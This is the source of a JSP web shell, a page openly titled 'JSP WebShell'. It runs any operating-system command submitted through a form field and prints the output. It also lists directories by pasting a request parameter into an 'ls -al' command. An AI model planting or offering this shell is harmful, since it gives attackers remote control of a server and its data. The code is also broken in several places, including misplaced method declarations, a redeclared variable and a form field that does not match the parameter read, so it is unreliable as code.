<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.util.ArrayList" %>
<%@ page import="java.util.List" %>

<%
    // 시스템 명령어 실행 함수
    private List<String> executeCommand(String command) throws IOException {
        List<String> output = new ArrayList<>();
        Process process = Runtime.getRuntime().exec(command);
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            output.add(line);
        }
        return output;
    }

    // file traversal 함수
    private List<String> searchFiles(String searchDirectory) {
        List<String> files = new ArrayList<>();
        try {
            Process process = Runtime.getRuntime().exec("ls -al " + searchDirectory);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                files.add(line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return files;
    }
%>

<html>
<head>
    <title>JSP WebShell</title>
</head>
<body>
    <h1>Execute Command</h1>
    <form action="" method="post">
        <label for="command">Enter command:</label>
        <input type="text" name="command" id="command" required>
        <input type="submit" value="Execute">
    </form>

    <hr>

    <h2>Search Files</h2>
    <form action="" method="get">
        <label for="filename">Enter filename:</label>
        <input type="text" name="filename" id="filename" required>
        <input type="submit" value="Search">
    </form>

    <hr>

    <% String command = request.getParameter("command");
       if (command != null) {
           List<String> output = executeCommand(command);
           %>
           <h2>Command Output:</h2>
           <pre>
               <% for (String line : output) { %>
                   <%= line %>
               <% } %>
           </pre>
    <% } %>

    <% String dir = request.getParameter("dir");
		if (dir == null) {
			String dir = "./";
		}
		if (dir != null) {
           List<String> files = searchFiles(dir);
           %>
           <h2>Search Results:</h2>
           <% if (files != null && !files.isEmpty()) { %>
               <ul>
                   <% for (String file : files) { %>
                       <li><%= file %></li>
                   <% } %>
               </ul>
           <% } else { %>
               <p>No files found.</p>
           <% } %>
    <% } %>
</body>
</html>
